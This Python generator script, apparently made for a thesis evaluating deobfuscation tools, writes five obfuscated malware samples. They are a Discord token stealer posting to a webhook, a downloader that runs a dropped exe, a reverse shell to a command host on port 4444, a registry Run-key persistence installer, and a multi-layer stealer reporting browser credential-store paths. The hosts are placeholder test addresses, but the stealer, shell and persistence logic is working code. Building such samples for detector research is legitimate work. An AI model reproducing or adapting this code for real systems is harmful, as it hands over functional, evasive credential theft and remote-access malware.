"""
Generates 5 realistic-looking obfuscated Python samples for thesis evaluation.
Payloads use RFC 5737 TEST-NET IPs (192.0.2.x) and placeholder credentials —
not functional malware.

Design rules:
  - XOR lambdas always at the TOP LEVEL of the file (never nested inside b64)
    because raw XOR-encoded strings can contain non-printable chars; repr()
    is used to embed them safely.
  - Each sample exercises a distinct primary technique set.
"""
import base64, zlib, os, textwrap

OUT = os.path.dirname(__file__)

# ── helpers ──────────────────────────────────────────────────────────────────

def b64(s: str) -> bytes:
    return base64.b64encode(s.encode())

def b64z(s: str) -> bytes:
    return base64.b64encode(zlib.compress(s.encode()))

def xor_str(s: str, key: int) -> str:
    return ''.join(chr(ord(c) ^ key) for c in s)

def chr_array(s: str) -> str:
    return '[' + ','.join(str(ord(c)) for c in s) + ']'

def int_xor_array(s: str, key: int) -> str:
    return '[' + ','.join(str(ord(c) ^ key) for c in s) + ']'

def bytes_array(s: str) -> str:
    return '[' + ','.join(str(b) for b in s.encode()) + ']'

def hex_str(s: str) -> str:
    return s.encode().hex()

def write(name: str, content: str):
    path = os.path.join(OUT, name)
    with open(path, 'w', encoding='utf-8') as f:
        f.write(content)
    print(f'  wrote {path}')

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE 1 — Discord token stealer
#
# Layers (2 independent, not nested):
#   A) XOR lambda at top level for the webhook URL
#   B) base64 for the grabber logic (references WEBHOOK variable)
#
# Transformers fired: XorArithmeticTransformer, EncodingsTransformer,
#                     ConstantPropagationTransformer, ExecutionTransformer,
#                     DeadCodeTransformer
# Expected iterations: 3
# ─────────────────────────────────────────────────────────────────────────────

KEY1 = 37
WEBHOOK = "https://discord.com/api/webhooks/1122334455/PLACEHOLDER_WEBHOOK_TOKEN"
webhook_xored = xor_str(WEBHOOK, KEY1)   # contains non-printable chars

# repr() produces a valid Python string literal with escape sequences
webhook_repr = repr(webhook_xored)       # e.g. 'MQQUV\x1f\n\n...'

# The base64 payload: grabber logic that references the WEBHOOK variable
grabber_src = textwrap.dedent("""\
    import os, re, requests
    def _grab():
        base = os.path.join(os.getenv('APPDATA') or '', 'discord', 'Local Storage', 'leveldb')
        found = []
        if os.path.isdir(base):
            for f in os.listdir(base):
                if not f.endswith(('.log', '.ldb')):
                    continue
                try:
                    data = open(os.path.join(base, f), errors='ignore').read()
                    found += re.findall(r'[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}', data)
                except Exception:
                    pass
        return list(set(found))
    toks = _grab()
    if toks:
        requests.post(WEBHOOK, json={'content': '\\n'.join(toks)})
""")

grabber_b64 = b64(grabber_src).decode()

sample_1 = f"""\
import base64
_d = lambda s: ''.join(chr(ord(c)^{KEY1}) for c in s)
WEBHOOK = _d({webhook_repr})
_enc = b"{grabber_b64}"
_src = base64.b64decode(_enc)
exec(_src.decode())
"""

write('sample_stealer.py', sample_1)

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE 2 — File dropper / downloader
#
# Layers:
#   A) chr() array for the download URL
#   B) bytes.fromhex() for the drop path
#   C) Constant propagation chain (_v1 → _v2 → _v3 → exec)
#   D) zlib+base64 for the download+exec logic
#
# Transformers fired: EncodingsTransformer (chr, fromhex, zlib+b64, decode),
#                     ConstantPropagationTransformer, ExecutionTransformer,
#                     DeadCodeTransformer
# Expected iterations: 3
# ─────────────────────────────────────────────────────────────────────────────

URL2    = "http://192.0.2.10/stage2.exe"
PATH2   = "C:\\Users\\Public\\svchost32.exe"

logic_2 = textwrap.dedent(f"""\
    import urllib.request, subprocess
    urllib.request.urlretrieve(_u, _p)
    subprocess.Popen([_p], shell=False)
""")

logic_b64z = b64z(logic_2).decode()
url_chars  = chr_array(URL2)
path_hex   = hex_str(PATH2)

sample_2 = f"""\
import base64, zlib
_u = ''.join(map(chr, {url_chars}))
_p = bytes.fromhex("{path_hex}").decode()
_v1 = b"{logic_b64z}"
_v2 = base64.b64decode(_v1)
_v3 = zlib.decompress(_v2)
exec(_v3.decode())
"""

write('sample_dropper.py', sample_2)

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE 3 — RAT / reverse-shell loader
#
# Layers:
#   A) __import__() obfuscation for base64 and sys modules
#   B) base64-encoded reverse-shell payload
#   C) Constant propagation chain (_enc → _src → exec)
#
# Transformers fired: ImportsTransformer, EncodingsTransformer,
#                     ConstantPropagationTransformer, ExecutionTransformer,
#                     DeadCodeTransformer
# Expected iterations: 3
# ─────────────────────────────────────────────────────────────────────────────

C2_HOST = "192.0.2.55"
C2_PORT = 4444
host_hex = hex_str(C2_HOST)

rat_src = textwrap.dedent(f"""\
    import socket, subprocess
    HOST = bytes.fromhex('{host_hex}').decode()
    PORT = {C2_PORT}
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    while True:
        cmd = s.recv(1024).decode(errors='ignore').strip()
        if not cmd:
            break
        try:
            out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
        except Exception as e:
            out = str(e).encode()
        s.sendall(out + b'\\n>> ')
    s.close()
""")

rat_b64 = b64(rat_src).decode()

sample_3 = f"""\
_b64 = __import__('base64')
_enc = b"{rat_b64}"
_src = _b64.b64decode(_enc).decode()
exec(_src)
"""

write('sample_rat_loader.py', sample_3)

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE 4 — Persistence installer
#
# Layers:
#   A) base64 outer shell
#   B) Inside decoded payload: inline XOR join (integers array) for registry key
#   C) Inside decoded payload: bytes([...]).decode() for exe path
#
# Transformers fired: EncodingsTransformer (b64, inline-XOR-ints, bytes-array),
#                     ExecutionTransformer, ConstantPropagationTransformer,
#                     DeadCodeTransformer
# Expected iterations: 3
# ─────────────────────────────────────────────────────────────────────────────

KEY4    = 19
REG_KEY = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
EXE     = "C:\\Users\\Public\\updater.exe"

rk_ints  = int_xor_array(REG_KEY, KEY4)   # stores ord(c)^19 as integers
exe_ints = bytes_array(EXE)               # raw byte values

inner_4 = textwrap.dedent(f"""\
    import winreg
    _rk = ''.join(chr(x^{KEY4}) for x in {rk_ints})
    _ep = bytes({exe_ints}).decode()
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, _rk, 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, 'WindowsUpdater', 0, winreg.REG_SZ, _ep)
    winreg.CloseKey(key)
""")

inner_4_b64 = b64(inner_4).decode()

sample_4 = f"""\
import base64
_a = b"{inner_4_b64}"
_b = base64.b64decode(_a)
exec(_b.decode())
"""

write('sample_persistence.py', sample_4)

# ─────────────────────────────────────────────────────────────────────────────
# SAMPLE 5 — Multi-layer info stealer  (4 nested layers)
#
# Layer 1 (file):     base64
# Layer 2 (in L1):    zlib + base64
# Layer 3 (in L2):    XOR lambda  ← placed at the TOP of L2 payload (not nested)
# Layer 4 (in L3):    exec of the final payload
#
# The XOR lambda in L3 uses repr() so the encoded string is valid Python source.
#
# Transformers fired (all 7): FoldingTransformer, EncodingsTransformer,
#   XorArithmeticTransformer, ConstantPropagationTransformer,
#   ImportsTransformer, ExecutionTransformer, DeadCodeTransformer
# Expected iterations: 4-5  → score Very High (60-75)
# ─────────────────────────────────────────────────────────────────────────────

KEY5 = 61
C2_5 = "http://192.0.2.99/collect"

# Final payload (Layer 4 — plain Python, the actual infostealer logic)
core_5 = textwrap.dedent(f"""\
    import os, requests
    C2 = "{C2_5}"
    PATHS = {{
        "Chrome": os.path.join(os.getenv("LOCALAPPDATA") or "", "Google", "Chrome", "User Data", "Default", "Login Data"),
        "Edge":   os.path.join(os.getenv("LOCALAPPDATA") or "", "Microsoft", "Edge",  "User Data", "Default", "Login Data"),
    }}
    def _exfil(data):
        try:
            requests.post(C2, json=data, timeout=5)
        except Exception:
            pass
    found = {{b: p for b, p in PATHS.items() if os.path.exists(p)}}
    _exfil({{"host": os.getenv("COMPUTERNAME"), "paths": list(found.keys())}})
""")

# Layer 3: XOR-encode core_5, embed with repr() for valid Python source
core_xored  = xor_str(core_5, KEY5)
core_repr   = repr(core_xored)          # safe Python string literal

layer3_src = textwrap.dedent(f"""\
    _x = lambda s: ''.join(chr(ord(c)^{KEY5}) for c in s)
    _payload = _x({core_repr})
    exec(_payload)
""")

# Layer 2: zlib+base64 encode layer3_src
layer3_b64z = b64z(layer3_src).decode()

layer2_src = textwrap.dedent(f"""\
    import base64, zlib
    exec(zlib.decompress(base64.b64decode(b"{layer3_b64z}")).decode())
""")

# Layer 1: base64 encode layer2_src
layer2_b64 = b64(layer2_src).decode()

sample_5 = f"""\
import base64
exec(base64.b64decode(b"{layer2_b64}").decode())
"""

write('sample_multilayer.py', sample_5)

print('\nDone. All 5 samples written.')